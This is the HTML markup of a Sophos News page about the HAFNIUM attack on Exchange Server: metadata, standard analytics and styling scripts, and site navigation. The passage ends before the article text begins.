<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://news.sophos.com/xmlrpc.php">
	<link rel="alternate" hreflang="es-419" href="https://news.sophos.com/es-419/2021/03/05/hafnium-advice-about-the-new-nation-state-attack" />
	<link rel="alternate" hreflang="nl-nl" href="https://news.sophos.com/nl-nl/2021/03/05/hafnium-advice-about-the-new-nation-state-attack" />
	<link rel="alternate" hreflang="pt-br" href="https://news.sophos.com/pt-br/2021/03/05/hafnium-advice-about-the-new-nation-state-attack" />
	<link rel="alternate" hreflang="de-de" href="https://news.sophos.com/de-de/2021/03/05/hafnium-advice-about-the-new-nation-state-attack" />
	<link rel="alternate" hreflang="en-us" href="https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack" />
	<link rel="alternate" hreflang="fr-fr" href="https://news.sophos.com/fr-fr/2021/03/05/hafnium-advice-about-the-new-nation-state-attack" />
	<link rel="alternate" hreflang="es-es" href="https://news.sophos.com/es-es/2021/03/05/hafnium-advice-about-the-new-nation-state-attack" />
	<link rel="alternate" hreflang="it-it" href="https://news.sophos.com/it-it/2021/03/05/hafnium-advice-about-the-new-nation-state-attack" />
	<link rel="alternate" hreflang="ja-jp" href="https://news.sophos.com/ja-jp/2021/03/05/hafnium-advice-about-the-new-nation-state-attack" />
	<link rel="alternate" hreflang="zh-tw" href="https://news.sophos.com/zh-tw/2021/03/05/hafnium-advice-about-the-new-nation-state-attack" />
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl+ '&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x';f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-5L6H3LN');</script>
<!-- End Google Tag Manager -->
<title>HAFNIUM: Advice about the new nation-state attack &#8211; Sophos News</title>
<meta name='robots' content='max-image-preview:large' />
<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="8r1qg681OjOolfxmHEY1IYupmTBdyKXc-OPfpgeQHFk" />
<link rel='dns-prefetch' href='//cdn.jsdelivr.net' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Feed" href="https://news.sophos.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Comments Feed" href="https://news.sophos.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; HAFNIUM: Advice about the new nation-state attack Comments Feed" href="https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/feed/" />
<script type="text/javascript">
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/news.sophos.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.0.1"}};
/*! This file is auto-generated */
!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode,e=(p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0),i.toDataURL());return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([129777,127995,8205,129778,127999],[129777,127995,8203,129778,127999])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(e=t.source||{}).concatemoji?c(e.concatemoji):e.wpemoji&&e.twemoji&&(c(e.twemoji),c(e.wpemoji)))}(window,document,window._wpemojiSettings);
</script>
<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 0.07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='all-css-0' href='https://news.sophos.com/_static/??-eJyNj9EOwjAIRX/IDpeomQ/Gb+komSjtmsJi+vfOmSXbm48XOMCBd3acUKZACqgKgdWglxFfTrgvvlRQq0JN5NTMAwfYEk+FSIE9CUVKtgtZfKXihAaP9T987m3zDsIx2XJiclmmgZOCki/4ABKvxpgLrf9/RcpcNgouj2rqfkaLia5r7/HWXs5ddzq21+4DN6hjBg==' type='text/css' media='all' />
<style id='wp-block-library-inline-css'>
.has-text-align-justify{text-align:justify;}
</style>
<style id='global-styles-inline-css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
</style>
<link rel='stylesheet' id='all-css-2' href='https://news.sophos.com/_static/??/wp-content/themes/sophosnews-2017/style-2021.css,/wp-content/mu-plugins/jetpack-11.1/css/jetpack.css?m=1658840194' type='text/css' media='all' />
<script type="text/javascript" src="https://news.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzwKiwtLUokoopZebmaeXVayjj0+Rbm5melFiSSpUsX2uraGZqYWFkTmQyAIAr9AiMg==" ></script><link rel="https://api.w.org/" href="https://news.sophos.com/wp-json/" /><link rel="alternate" type="application/json" href="https://news.sophos.com/wp-json/wp/v2/posts/73211" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://news.sophos.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://news.sophos.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 6.0.1" />
<link rel="canonical" href="https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/" />
<link rel='shortlink' href='https://news.sophos.com/?p=73211' />
<link rel="alternate" type="application/json+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2021%2F03%2F05%2Fhafnium-advice-about-the-new-nation-state-attack%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2021%2F03%2F05%2Fhafnium-advice-about-the-new-nation-state-attack%2F&#038;format=xml" />
<style>img#wpstats{display:none}</style>
	<link rel="amphtml" href="https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/amp/">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="HAFNIUM: Advice about the new nation-state attack" />
<meta property="og:url" content="https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/" />
<meta property="og:description" content="Update: Microsoft released new security updates for Exchange Server on April 13th (CVE-2021-28480, 28481, 28482, and 28483).  The updates address bugs reported to Microsoft by the NSA and are consi…" />
<meta property="article:published_time" content="2021-03-05T23:37:38+00:00" />
<meta property="article:modified_time" content="2021-08-25T14:07:11+00:00" />
<meta property="og:site_name" content="Sophos News" />
<meta property="og:image" content="https://news.sophos.com/wp-content/uploads/2018/08/technology-servers-server-159282.jpeg?w=640" />
<meta property="og:image:secure_url" content="https://news.sophos.com/wp-content/uploads/2018/08/technology-servers-server-159282.jpeg?w=640" />
<meta property="og:image:width" content="640" />
<meta property="og:image:height" content="480" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta property="fb:admins" content="28552295016" />
<meta name="twitter:text:title" content="HAFNIUM: Advice about the new nation-state attack" />
<meta name="twitter:image" content="https://news.sophos.com/wp-content/uploads/2018/08/technology-servers-server-159282.jpeg?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=32" sizes="32x32" />
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=192" sizes="192x192" />
<link rel="apple-touch-icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=180" />
<meta name="msapplication-TileImage" content="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=270" />
</head>

<body class="post-template-default single single-post postid-73211 single-format-standard group-blog">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5L6H3LN&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<div id="page" class="hfeed site">
	<a class="sr-only" href="#content">Skip to content</a>

	
<header class="bg-blue-600" x-data="{ mobileMenu: false, searchField: false }">
	<div class="container">
		<div class="flex items-center justify-between h-16">

			<!-- Logo -->
			<div class="flex-shrink-0">
				<a class="site-logo" href="https://news.sophos.com/en-us/" rel="home">
				<svg width="172" height="17" xmlns="http://www.w3.org/2000/svg">
					<g fill="#FFF" fill-rule="evenodd">
						<path d="M113.024 5.298V16.74h-2.595V.259h2.265l7.997 11.49V.26h2.619v16.482h-2.289l-7.997-11.443M126.064.259h10.78v2.307H128.8v4.521h7.549v2.214h-7.55v5.133h8.376v2.307h-11.111V.259M138.478.259h2.855l2.694 12.29L147.29.26h2.783l3.61 12.314L156.005.26h2.783l-3.62 16.482h-2.76l-3.751-12.126-3.426 12.126h-2.784L138.478.259M168.933 4.968v-.283c0-1.318-.778-2.425-3.492-2.425-2.43 0-3.279 1.013-3.279 2.284 0 1.201.708 1.743 2.218 2.073l3.491.776c2.123.448 4.129 1.602 4.129 4.333 0 3.014-1.675 5.274-6.204 5.274-5.214 0-6.559-2.26-6.559-4.52v-.307h2.737v.26c0 1.2.755 2.284 3.774 2.284 2.5 0 3.421-1.084 3.421-2.638 0-1.224-.731-1.907-2.289-2.237l-3.49-.777c-2.407-.517-3.917-1.742-3.917-4.309 0-2.566 1.77-4.756 6.016-4.756 4.553 0 6.18 2.26 6.18 4.639v.33h-2.736M85.303 16.718h8.88c2.492 0 3.549-.15 4.379-.677 1.308-.803 2.139-2.378 2.139-4.162 0-1.457-.504-2.868-1.258-3.622-.981-1.006-2.316-1.382-4.783-1.382h-2.693c-1.208 0-2.097-.05-2.6-.276-.605-.277-.956-.81-.956-1.562 0-.88.427-1.455 1.132-1.632.529-.124 1.14-.124 2.726-.15h7.949V.265h-8.754c-1.963 0-2.843.075-3.598.353-1.737.602-2.921 2.383-2.921 4.518 0 1.458.58 2.745 1.587 3.624.881.753 2.189 1.105 4.202 1.105h3.584c.805 0 1.46.1 1.813.3.678.327 1.08.934 1.08 1.714 0 .652-.301 1.122-.83 1.447-.426.278-1.158.403-2.49.403h-8.588v2.99zm-84.945 0h8.88c2.492 0 3.549-.15 4.38-.677 1.307-.803 2.138-2.378 2.138-4.162 0-1.457-.504-2.868-1.258-3.622-.982-1.006-2.316-1.382-4.783-1.382H7.023c-1.209 0-2.098-.05-2.6-.276-.605-.277-.957-.81-.957-1.562 0-.88.427-1.455 1.132-1.632.53-.124 1.141-.124 2.726-.15h7.95V.265H6.52c-1.964 0-2.844.075-3.6.353C1.185 1.22 0 3 0 5.136 0 6.594.582 7.881 1.587 8.76c.881.753 2.19 1.105 4.203 1.105h3.582c.807 0 1.46.1 1.814.3.678.327 1.08.934 1.08 1.714 0 .652-.3 1.122-.83 1.447-.426.278-1.157.403-2.49.403H.358v2.99zM71.99 4.596c-.52.813-.765 2.118-.765 3.87 0 3.845 1.331 5.595 4.294 5.595 2.915 0 4.248-1.75 4.248-5.546 0-3.847-1.308-5.571-4.248-5.571-1.604 0-2.864.592-3.53 1.652zm10.05-1.897c1.013 1.33 1.58 3.498 1.58 6.039 0 2.882-.914 5.249-2.544 6.555-1.233.986-3.11 1.528-5.335 1.528-3.16 0-5.654-1.037-6.937-2.884-.964-1.355-1.435-3.155-1.435-5.35 0-3.152.866-5.544 2.495-6.826C71.149.726 73.175.158 75.497.158c2.938 0 5.284.913 6.543 2.54zM65.36.279h-3.507v6.73h-6.345V.278h-3.507v16.439h3.507V9.94h6.345v6.778h3.506V.278zM43.533 8.042c.938 0 1.48-.123 1.852-.469.442-.37.715-1.158.715-2.07 0-1.084-.443-1.872-1.208-2.144-.272-.1-.717-.149-1.286-.149h-4.839v4.832h4.766zm-4.766 8.674h-3.507V.278h8.223c2.889 0 3.902.295 4.988 1.504.964 1.036 1.481 2.39 1.481 3.845 0 1.725-.69 3.327-1.826 4.289-.962.813-1.854 1.058-3.728 1.058h-5.63v5.743zM21.665 4.596c-.519.813-.764 2.118-.764 3.87 0 3.845 1.333 5.595 4.297 5.595 2.913 0 4.247-1.75 4.247-5.546 0-3.847-1.308-5.571-4.247-5.571-1.606 0-2.866.592-3.533 1.652zm10.052-1.897c1.014 1.33 1.581 3.498 1.581 6.039 0 2.882-.914 5.249-2.545 6.555-1.233.986-3.11 1.528-5.333 1.528-3.162 0-5.656-1.037-6.94-2.884-.964-1.355-1.432-3.155-1.432-5.35 0-3.152.865-5.544 2.496-6.826C20.825.726 22.85.158 25.173.158c2.938 0 5.286.913 6.544 2.54z"/>
					</g>
				</svg>
				</a>
			</div>

			<!-- Search Field -->
			<div class="lg:flex justify-end flex-grow hidden" x-show="searchField" x-cloak>
				<div class="relative w-1/2 rounded-md shadow-sm">
					<form role="search" method="get" action="https://news.sophos.com/en-us/">
						<input
							type="text"
							class="block w-full text-lg text-white placeholder-gray-100 bg-blue-800 border-0 rounded-md font-sansMedium font-medium"
							placeholder="Type to Search News"
							x-ref="searchInput"
							name="s"
						/>
						<div class="absolute inset-y-0 right-0 flex items-center px-3">
							<button
								class="hover:opacity-100 opacity-60 p-1 text-xs text-white uppercase rounded-full cursor-pointer"
								type="submit"
							>
								Search							</button>
						</div>
					</form>
				</div>
			</div>

			<!-- Main Nav -->
			<div class="lg:flex items-center flex-grow hidden" x-show="!searchField" x-cloak>
				<div class="flex ml-auto">
				<ul id="menu-en-us-primary" class="primary-menu"><li id="menu-item-77773" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-77773"><a href="https://news.sophos.com/en-us/category/products-services/">Products &amp; Services<div class="menu-item-description"></div></a></li>
<li id="menu-item-77772" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77772"><a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations<div class="menu-item-description"></div></a></li>
<li id="menu-item-77774" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77774"><a href="https://news.sophos.com/en-us/category/threat-research/">Threat Research<div class="menu-item-description"></div></a></li>
<li id="menu-item-85326" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-85326"><a href="https://news.sophos.com/en-us/category/ai-research/">AI Research<div class="menu-item-description"></div></a></li>
<li id="menu-item-77776" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-77776"><a href="https://nakedsecurity.sophos.com">Security News<div class="menu-item-description"></div></a></li>
<li id="menu-item-83702" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-83702"><a href="https://news.sophos.com/en-us/category/sophos-life/">Sophos Life<div class="menu-item-description"></div></a></li>
</ul>				</div>
			</div>

			<!-- Search button -->
			<div class="lg:block hidden ml-4">
				<div class="flex items-center">
					<button
					class="border-2 border-transparent hover:border-white inline-flex items-center justify-center p-2 text-white rounded-md focus:outline-none transition-colors"
					@click.prevent="searchField = !searchField; $nextTick(() => { setTimeout(() => { $refs.searchInput.focus(); }, 150);});"
					>
						<span class="sr-only">Search</span>
						<!-- Heroicon name: outline/bell -->
						<svg
							class="w-5 h-5"
							xmlns="http://www.w3.org/2000/svg"
							fill="none"
							viewBox="0 0 24 24"
							stroke="currentColor"
							:class="{ 'block': !searchField, 'hidden': searchField }"
						>
							<path
							stroke-linecap="round"
							stroke-linejoin="round"
							stroke-width="3"
							d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
							/>
						</svg>
						<svg
							class="hidden w-5 h-5"
							xmlns="http://www.w3.org/2000/svg"
							fill="none"
							viewBox="0 0 24 24"
							stroke="currentColor"
							aria-hidden="true"
							:class="{ 'block': searchField, 'hidden': !searchField }"
						>
							<path
							stroke-linecap="round"
							stroke-linejoin="round"
							stroke-width="3"
							d="M6 18L18 6M6 6l12 12"
							/>
						</svg>
					</button>
				</div>
			</div>

			<!-- Mobile menu button -->
			<div class="lg:hidden flex -mr-2">
				<button
					type="button"
					class="hover:text-white hover:bg-blue-800 focus:outline-none hover:ring-2 focus:ring-offset-2 focus:ring-offset-gray-300 focus:ring-white inline-flex items-center justify-center p-2 text-white rounded-md"
					aria-controls="mobile-menu"
					aria-expanded="false"
					@click="mobileMenu = !mobileMenu"
				>
					<span class="sr-only">Open main menu</span>
					<!--
						Heroicon name: outline/menu

						Menu open: "hidden", Menu closed: "block"
					-->
					<svg
					class="block w-6 h-6"
					xmlns="http://www.w3.org/2000/svg"
					fill="none"
					viewBox="0 0 24 24"
					stroke="currentColor"
					:class="{ 'block': !mobileMenu, 'hidden': mobileMenu }"
					>
					<path
						stroke-linecap="round"
						stroke-linejoin="round"
						stroke-width="3"
						d="M4 6h16M4 12h16m-7 6h7"
					/>
					</svg>
					<!--
						Heroicon name: outline/x

						Menu open: "block", Menu closed: "hidden"
					-->
					<svg
					class="hidden w-6 h-6"
					xmlns="http://www.w3.org/2000/svg"
					fill="none"
					viewBox="0 0 24 24"
					stroke="currentColor"
					aria-hidden="true"
					:class="{ 'block': mobileMenu, 'hidden': !mobileMenu }"
					>
					<path
						stroke-linecap="round"
						stroke-linejoin="round"
						stroke-width="3"
						d="M6 18L18 6M6 6l12 12"
					/>
					</svg>
				</button>
			</div>
		</div>
	</div>

	<!-- Mobile menu, show/hide based on menu state. -->
	<div
	class="lg:hidden container"
	x-show="mobileMenu"
	x-cloak
	x-transition:enter="transition-all ease-out duration-100"
	x-transition:enter-start="transform opacity-0 scale-95"
	x-transition:enter-end="transform opacity-100 scale-100"
	x-transition:leave="transition ease-in duration-75"
	x-transition:leave-start="transform opacity-100 scale-100"
	x-transition:leave-end="transform opacity-0 scale-95"
	>
		<div class="pt-2 pb-8 space-y-2">
			<div class="relative rounded-md shadow-sm">
				<form role="search" method="get" action="https://news.sophos.com/en-us/">
					<input
						type="text"
						class="focus:ring-blue-600 focus:border-blue-600 sm:text-sm block w-full placeholder-gray-600 border-gray-300 rounded-md"
						placeholder="Search News"
						name="s"
					/>
					<div
						class="absolute inset-y-0 right-0 flex items-center px-3 pointer-events-none"
					>
						<button class="p-1 text-gray-500 rounded-full" type="submit">
							<span class="sr-only">Search</span>
							<!-- Heroicon name: outline/bell -->
							<svg
								class="w-4 h-4"
								xmlns="http://www.w3.org/2000/svg"
								fill="none"
								viewBox="0 0 24 24"
								stroke="currentColor"
							>
								<path
									stroke-linecap="round"
									stroke-linejoin="round"
									stroke-width="3"
									d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
								/>
							</svg>
						</button>
					</div>
				</form>
			</div>

			<ul id="menu-en-us-primary-1" class="mobile-menu"><li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-77773"><a href="https://news.sophos.com/en-us/category/products-services/">Products &amp; Services<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77772"><a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77774"><a href="https://news.sophos.com/en-us/category/threat-research/">Threat Research<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-85326"><a href="https://news.sophos.com/en-us/category/ai-research/">AI Research<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-77776"><a href="https://nakedsecurity.sophos.com">Security News<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-83702"><a href="https://news.sophos.com/en-us/category/sophos-life/">Sophos Life<div class="menu-item-description"></div></a></li>
</ul>		</div>
	</div>
</header>

	<div id="content">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-73211" class="post-73211 post type-post status-publish format-standard has-post-thumbnail hentry category-products-services tag-hafnium tag-mtr tag-rapid-response tag-sophos-mtr tag-sophos-rapid-response region-en-us">

		<div class="md:mt-16 container mt-8">
		<div class="relative max-w-5xl mx-auto">
				<div
						class="aspect-w-16 aspect-h-9 flex bg-gray-400 bg-right bg-no-repeat bg-cover"
				>
